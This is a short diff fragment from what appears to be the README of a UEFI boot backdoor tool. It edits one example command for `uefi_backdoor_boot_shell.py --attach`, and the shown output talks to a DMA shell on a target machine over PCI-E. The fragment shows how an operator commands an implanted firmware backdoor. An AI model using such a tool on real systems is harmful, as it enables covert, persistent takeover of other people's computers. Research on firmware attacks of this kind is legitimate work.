@@ -580,7 +580,7 @@ nt authority\system
 Now, when Boot Backdoor with its payload was sucessfully loaded, you can run `uefi_backdoor_boot_shell.py` with `--attach` option to communicate with currently running instance of DMA Shell:
 
 ```
-$ ./uefi_backdoor_boot_shell.py --attach --command "dir C:\\"
+$ ./uefi_backdoor_boot_shell.py --attach --command "hostname"
 [+] PCI-E link with target is up
 [+] Device address is 01:00.0
 [+] Payload shared memory region is at 0x00200000
